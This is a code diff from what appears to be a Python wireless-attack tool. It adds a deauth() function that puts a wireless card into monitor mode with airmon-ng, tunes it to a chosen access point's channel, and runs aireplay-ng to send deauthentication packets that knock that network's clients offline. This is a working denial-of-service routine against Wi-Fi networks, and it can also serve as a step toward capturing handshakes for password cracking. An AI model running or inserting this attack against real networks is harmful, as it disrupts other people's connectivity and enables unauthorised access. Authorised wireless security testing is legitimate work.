@@ -2,6 +2,7 @@ from utils import exec_sync
 import os
 
 # location of various fields in each line of csv file
+bssid_index = 0
 chan_index = 3
 priv_index = 5
 ciph_index = 6
@@ -41,6 +42,48 @@ def get_input(prompt, count):
         except ValueError:
             print("\nThat's not a valid choice. Please try again.")
     return choice
+
+# sends deauth packets to chosen access_point
+def deauth(ap_id,interface):
+
+
+    ap = ssid_list[ap_id-1]
+    ap_ssid = ap[ssid_index].strip()
+    mac = ap[bssid_index].strip()
+    channel = ap[chan_index].strip()
+
+    # airmon-ng check kill
+    exec_sync(["airmon-ng", "check", "kill"],
+              "Executing `airmon-ng check kill`... ",
+              "Error: failed to kill conflicting processes.",
+              "Done.")
+    
+    #start airmon-ng
+    exec_sync(['airmon-ng', 'start', interface],
+              "Switching {0} to monitor mode... ".format(interface),
+              "Error: could not switch {0} to monitor mode using `airmon-ng start {0}`".format(interface),
+              "Done.")
+
+    #switch wireless card channel to target channel so aireplay will work
+    exec_sync(['iwconfig', interface+'mon', 'channel', channel],
+              "Switching channel of {0} to target channel... ".format(interface),
+              "Error: could not switch {0} to monitor mode using `airmon-ng start {0}`".format(interface),
+              "Done.")
+
+    #run aireplay attack
+    exec_sync(["aireplay-ng", "-0", "1" ,"-a", mac, interface+"mon"],
+              "Deauthing clients currently connected to {0}... ".format(ap_ssid),
+              "Error: failed to deauth clients.",
+              "Done.")
+
+    #stop airmon-ng
+    exec_sync(['airmon-ng', 'stop', interface + "mon"],
+              "Stopping {0} monitor mode... ".format(interface + "mon"),
+              "Error: could not stop {0} monitor mode using `airmon-ng stop {0}`".format(interface  + "mon"),
+              "Done.")
+
+
+
 
 # choose an access_point from the list of found access points
 def choose_access_point():
